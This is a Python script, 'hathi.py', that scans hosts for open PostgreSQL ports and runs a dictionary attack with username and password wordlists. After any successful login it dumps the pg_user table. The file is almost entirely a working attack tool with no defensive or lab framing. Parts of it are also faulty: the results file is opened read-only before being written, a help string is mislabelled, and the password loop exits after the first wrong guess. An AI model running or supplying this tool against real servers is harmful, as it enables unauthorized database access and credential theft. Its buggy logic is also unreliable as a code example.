"""
usage: hathi.py [-h] [--usernames USERNAMES] [--passwords PASSWORDS] [--results RESULTS] host [host ...]

Port scan and dictionary attack postgresql servers.

positional arguments:
  host                  host to connect to

optional arguments:
  -h, --help            show this help message and exit
  --usernames USERNAMES
                        password list
  --passwords PASSWORDS
                        password list
  --results RESULTS     path to a results file
"""

import argparse
import time
import asyncio
import asyncpg
from typing import List
from collections import namedtuple

timeout = 1.0
SSL_MODE = "prefer"  # Try SSL first and fallback to non-SSL if failed
POSTGRES_PORT = 5432
DATABASE_NAME = "postgres"
DEBUG=False

Match = namedtuple("Match", "username password host database data")


async def try_hosts(hosts: List[str], port: int = POSTGRES_PORT):
    found = 0
    for host in hosts:
        try:
            future = asyncio.open_connection(host=host, port=port)
            _, w = await asyncio.wait_for(future, timeout=timeout)
            yield host
            found += 1
            w.close()
        except (asyncio.TimeoutError, OSError):
            pass  # closed


async def try_connection(host: str, database: str, usernames: str, passwords: str, debug=DEBUG):
    with open(usernames, "r") as username_list:
        for username in username_list:
            username = username.strip()
            with open(passwords, "r") as password_list:
                for password in password_list:
                    password = password.strip()
                    try:
                        conn = await asyncpg.connect(
                            user=username,
                            password=password,
                            database=database,
                            host=host,
                            ssl=SSL_MODE,
                            timeout=timeout,
                        )
                        data = await conn.fetch("SELECT * from pg_user;")
                        if debug:
                            print(f"Matched {username}:{password} on {host}")
                        yield Match(username, password, host, database, data)
                        await conn.close()
                        break
                    except asyncpg.exceptions.InvalidAuthorizationSpecificationError as pe:
                        if debug:
                            print(f"Invalid username {username} : ({pe})")
                        break
                    except asyncpg.exceptions.InvalidPasswordError as pe:
                        if debug:
                            print(f"Invalid password {password} : ({pe})")
                        break
                    except asyncpg.exceptions._base.PostgresError as pe:
                        if debug:
                            print(f"Failed {username}:{password} on {host} {pe} {type(pe)}")
                        pass  # bad username, password, access or other
                    except asyncio.TimeoutError:
                        if debug:
                            print(f"Timeout {username}:{password} on {host}")
                        pass  # closed


async def scan(hosts: List[str], usernames: str, passwords: str):
    open_hosts = []
    async for open_host in try_hosts(hosts):
        open_hosts.append(open_host)

    print(f"Found open hosts {open_hosts}, trying to connect")
    matched_connections = []

    for host in open_hosts:
        async for match in try_connection(
            host, DATABASE_NAME, usernames, passwords
        ):
            matched_connections.append(match)
    return matched_connections


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Port scan and dictionary attack postgresql servers."
    )
    parser.add_argument(
        "hosts", metavar="host", type=str, nargs="+", help="host to connect to"
    )
    parser.add_argument(
        "--usernames", type=str, default="usernames.txt", help="password list"
    )
    parser.add_argument(
        "--passwords", type=str, default="passwords.txt", help="password list"
    )
    parser.add_argument(
        "--results", type=str, help="path to a results file"
    )
    args = parser.parse_args()
    start = time.time()

    results = asyncio.run(scan(args.hosts, args.usernames, args.passwords))

    if args.results:
        with open(args.results) as results_f:
            results_f.writelines(results)

    for result in results:
        print(f"{result}")

    print("Completed scan in {0} seconds".format(time.time() - start))
